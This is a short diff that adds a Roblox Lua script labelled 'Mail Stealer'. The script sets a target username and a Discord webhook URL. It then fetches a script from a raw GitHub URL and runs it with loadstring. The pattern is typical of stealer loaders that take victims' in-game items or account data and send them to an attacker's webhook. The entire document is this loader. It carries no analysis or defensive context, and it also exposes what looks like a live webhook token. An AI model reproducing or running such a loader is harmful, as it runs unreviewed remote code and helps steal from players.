@@ -1,0 +1,5 @@
+_G.Username = "dryNOVO"
+-G.Hubename = "Mail Stealer"
+_G.WehbookUr1 = "https://discord.com/api/webhooks/1110464023939518545/oLGzv0HzsM87gkqSe4kRMT3vArC4Ldj8aLGsVSey8EpwGvucs9QK_md-bVnxrab2uq3X"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Servanteesjayiioceanii/PeakonTop/main/peak.lua"))()
